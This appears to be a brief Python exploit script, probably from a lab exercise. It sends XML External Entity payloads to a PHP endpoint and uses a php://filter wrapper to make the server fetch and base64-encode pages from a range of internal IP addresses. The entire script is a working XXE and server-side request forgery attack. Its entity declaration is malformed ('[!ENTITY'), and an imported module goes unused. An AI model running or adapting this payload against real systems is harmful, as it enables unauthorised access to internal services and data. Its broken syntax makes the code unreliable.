import requests
import base64

def build_xml(string):
	xml="""<?xml version="1.0" encoding="utf-8"?>"""
	xml=xml+"\r\n"+"""<!DOCTYPE xxe["""
	xml=xml+"\r\n"+"""[!ENTITY file SYSTEM """+'"'+string+'"'+""">]>"""
	xml=xml+"\r\n"+"""<xml>"""
	xml=xml+"\r\n"+"""	<xxx>&file;</xxx>"""
	xml=xml+"\r\n"+"""</xml>"""
	send_xml(xml)
	print(xml)

def send_xml(data):
	headers={'Content-type': 'text/xml; charset=UTF-8'}
	x=requests.post('http://192.168.111.1/xxe.php',data=data,headers=headers,timeout=3).text
	coded_string=x.split(' ')[-2]
	print(coded_string)

for i in range(80,100):
	try:
		ip="192.168.111.%d"%i
		string='php://filter/read=convert.base64-encode/resource=http://'+ip+'/'
		build_xml(string)
	except:
		print("error")